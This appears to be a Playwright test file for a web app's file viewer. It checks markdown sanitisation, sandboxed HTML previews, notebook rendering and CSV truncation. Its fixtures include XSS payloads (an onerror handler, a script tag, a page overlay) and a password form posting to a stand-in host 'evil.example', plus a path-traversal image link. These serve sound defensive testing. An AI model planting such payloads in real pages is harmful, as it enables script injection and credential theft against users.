/**
 * F133 S3 — rendered markdown, HTML, CSV and notebook views, and the
 * Rendered/Source toggle.
 *
 * Same setup as file-viewer.spec.js: a throwaway git repo registered through
 * POST /api/repos, so every meta, classification and byte is the server's.
 */
import { mkdirSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { expect, test } from './auth-fixture.js'
import { registerFixtureRepo } from './helpers/fixtureRepo.js'

const PNG_B64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=='

const PAGE_HTML = `<!doctype html><html><head><title>orig</title></head><body>
<p id="static">static body</p>
<script>
  document.title = 'ran';
  parent.postMessage('ran', '*');
  try { parent.document.title; parent.postMessage('reached-parent', '*') }
  catch (e) { parent.postMessage(e.name, '*') }
</script>
</body></html>`

const MD_A = `# Doc A

<img src=x onerror="window.__pwned=1">
<script>window.__pwned=2</script>
<div id="overlay" style="position:fixed;inset:0;z-index:9999">overlay</div>
<form action="https://evil.example"><input name="password"></form>

![pic](img/b.png)

![escape](../../out.png)

[next](b.md)
`

const CSV = ['id,name', ...Array.from({ length: 1500 }, (_, i) => `${i + 1},row ${i + 1}`)].join('\n') + '\n'

const NOTEBOOK = JSON.stringify({
  nbformat: 4,
  nbformat_minor: 5,
  metadata: { language_info: { name: 'python' } },
  cells: [
    { cell_type: 'markdown', metadata: {}, source: ['# Notebook title\n', 'Some *text*.'] },
    {
      cell_type: 'code',
      metadata: {},
      execution_count: 1,
      source: ['def f(x):\n', '    return x + 1  # add'],
      outputs: [
        { output_type: 'stream', name: 'stdout', text: ['hello\n'] },
        { output_type: 'display_data', metadata: {}, data: { 'image/png': PNG_B64, 'text/plain': ['<Figure>'] } },
      ],
    },
  ],
})

test.describe.configure({ mode: 'serial' })

let projectId

test.beforeAll(async ({ playwright }) => {
  projectId = await registerFixtureRepo(playwright, 'f133-render-', (root) => {
    mkdirSync(join(root, 'docs', 'img'), { recursive: true })
    writeFileSync(join(root, 'docs', 'a.md'), MD_A)
    writeFileSync(join(root, 'docs', 'b.md'), '# Doc B\n')
    writeFileSync(join(root, 'docs', 'img', 'b.png'), Buffer.from(PNG_B64, 'base64'))
    writeFileSync(join(root, 'page.html'), PAGE_HTML)
    writeFileSync(join(root, 'data.csv'), CSV)
    writeFileSync(join(root, 'n.ipynb'), NOTEBOOK)
  })
})

const fileUrl = (path) => `/files?project=${projectId}&path=${encodeURIComponent(path)}`

// Messages the frame posts to its parent: the only channel an opaque-origin
// frame has, and proof of whether its script ran at all.
async function collectMessages(page) {
  await page.addInitScript(() => {
    window.__frameMsgs = []
    window.addEventListener('message', (e) => window.__frameMsgs.push(e.data))
  })
}

async function htmlFrame(page) {
  const el = page.getByTestId('file-html-frame')
  await expect(el).toBeAttached()
  const frame = await (await el.elementHandle()).contentFrame()
  await frame.waitForLoadState('load')
  return { el, frame }
}

test('test_html_preview_runs_no_script_by_default', async ({ page }) => {
  await collectMessages(page)
  await page.goto(fileUrl('page.html'))
  const view = page.getByTestId('file-html-view')
  await expect(view).toHaveAttribute('data-scripts', 'off')
  const { el, frame } = await htmlFrame(page)

  await expect(el).toHaveAttribute('sandbox', '')
  const sandbox = await el.getAttribute('sandbox')
  expect(sandbox).not.toContain('allow-scripts')
  expect(sandbox).not.toContain('allow-same-origin')
  await expect(frame.locator('#static')).toHaveText('static body')
  expect(await frame.title()).toBe('orig')
  expect(await page.evaluate(() => window.__frameMsgs)).toEqual([])
})

test('test_html_scripts_toggle_runs_scripts_in_an_opaque_origin', async ({ page }) => {
  await collectMessages(page)
  await page.goto(fileUrl('page.html'))
  await htmlFrame(page)
  await page.getByTestId('file-html-scripts').click()
  await expect(page.getByTestId('file-html-view')).toHaveAttribute('data-scripts', 'on')

  const { el, frame } = await htmlFrame(page)
  await expect(el).toHaveAttribute('sandbox', 'allow-scripts')
  await expect.poll(() => page.evaluate(() => window.__frameMsgs)).toEqual(['ran', 'SecurityError'])
  expect(await frame.title()).toBe('ran')

  // A source change resets the toggle: drive the drawer to another file and back.
  await page.evaluate(async (project) => {
    const mod = await import('/src/composables/useFilePreview.js')
    mod.openFilePreview({ project: String(project), path: 'page.html' })
  }, projectId)
  const drawer = page.getByTestId('file-preview-drawer')
  await drawer.getByTestId('file-html-scripts').click()
  await expect(drawer.getByTestId('file-html-view')).toHaveAttribute('data-scripts', 'on')
  await page.evaluate(async (project) => {
    const mod = await import('/src/composables/useFilePreview.js')
    mod.openFilePreview({ project: String(project), path: 'data.csv' })
  }, projectId)
  await expect(drawer.getByTestId('file-csv-view')).toBeVisible()
  await page.evaluate(async (project) => {
    const mod = await import('/src/composables/useFilePreview.js')
    mod.openFilePreview({ project: String(project), path: 'page.html' })
  }, projectId)
  await expect(drawer.getByTestId('file-html-view')).toHaveAttribute('data-scripts', 'off')
  await expect(drawer.getByTestId('file-html-frame')).toHaveAttribute('sandbox', '')
})

test('test_markdown_is_sanitized', async ({ page }) => {
  await page.goto(fileUrl('docs/a.md'))
  const view = page.getByTestId('file-markdown-view')
  await expect(view.locator('h1')).toHaveText('Doc A')
  await expect(view.locator('[onerror]')).toHaveCount(0)
  await expect(view.locator('script')).toHaveCount(0)
  await expect(view.locator('form, input')).toHaveCount(0)
  await expect(view.locator('#overlay')).not.toHaveAttribute('style', /.+/)
  expect(await page.evaluate(() => window.__pwned)).toBeUndefined()
})

test('test_relative_image_in_markdown_loads_from_the_same_source', async ({ page }) => {
  const raw = []
  page.on('request', (req) => {
    const u = new URL(req.url())
    if (u.pathname === '/api/files/raw') raw.push(u.searchParams.get('path'))
  })
  await page.goto(fileUrl('docs/a.md'))
  const view = page.getByTestId('file-markdown-view')
  const img = view.locator('img[alt="pic"]')
  await expect(img).toHaveAttribute('src', /^blob:/)
  await expect.poll(() => img.evaluate((el) => el.complete && el.naturalWidth)).toBeGreaterThan(0)
  expect(raw).toContain('docs/img/b.png')

  const escaped = view.locator('img[alt="escape"]')
  await expect(escaped).toHaveAttribute('data-fv-refused', 'true')
  await expect(escaped).not.toHaveAttribute('src', /.+/)
  expect(raw.filter((p) => p && p.includes('out.png'))).toEqual([])

  await view.getByRole('link', { name: 'next' }).click()
  await expect(page).toHaveURL(/path=docs(%2F|\/)b\.md/)
  await expect(page.getByTestId('file-viewer-name')).toHaveText('b.md')
  await expect(page.getByTestId('file-markdown-view').locator('h1')).toHaveText('Doc B')
})

test('test_notebook_renders_cells_and_image_outputs', async ({ page }) => {
  await page.goto(fileUrl('n.ipynb'))
  const view = page.getByTestId('file-notebook-view')
  await expect(view.getByTestId('file-markdown-view').locator('h1')).toHaveText('Notebook title')
  await expect(view.locator('em')).toHaveText('text')

  const code = view.getByTestId('file-notebook-code')
  await expect(code).toContainText('def f(x):')
  await expect.poll(() => code.evaluate((el) =>
    new Set([...el.querySelectorAll('span[class*="mtk"]')].map((s) => s.className)).size))
    .toBeGreaterThan(1)

  await expect(view.locator('[data-output="text"]')).toContainText('hello')
  const png = view.getByTestId('file-notebook-image')
  await expect(png).toHaveAttribute('src', /^data:image\/png;base64,/)
  await expect.poll(() => png.evaluate((el) => el.complete && el.naturalWidth)).toBeGreaterThan(0)
})

test('test_csv_renders_as_a_truncated_table_with_a_source_toggle', async ({ page }) => {
  await page.goto(fileUrl('data.csv'))
  const view = page.getByTestId('file-csv-view')
  await expect(view.locator('thead th')).toHaveText(['id', 'name'])
  await expect(view.locator('tbody tr')).toHaveCount(1000)
  await expect(view.locator('tbody tr').last().locator('td').first()).toHaveText('1000')
  await expect(view.getByTestId('file-csv-truncated')).toContainText('1,000 of 1,500')

  await page.getByTestId('file-view-source').click()
  const code = page.getByTestId('file-code-view')
  await expect(code).toHaveAttribute('data-ready', 'true', { timeout: 20000 })
  await expect(code.locator('.view-line').first()).toHaveText('id,name')
  await expect(page.getByTestId('file-csv-view')).toHaveCount(0)

  await page.getByTestId('file-view-rendered').click()
  await expect(page.getByTestId('file-csv-view').locator('tbody tr')).toHaveCount(1000)
})
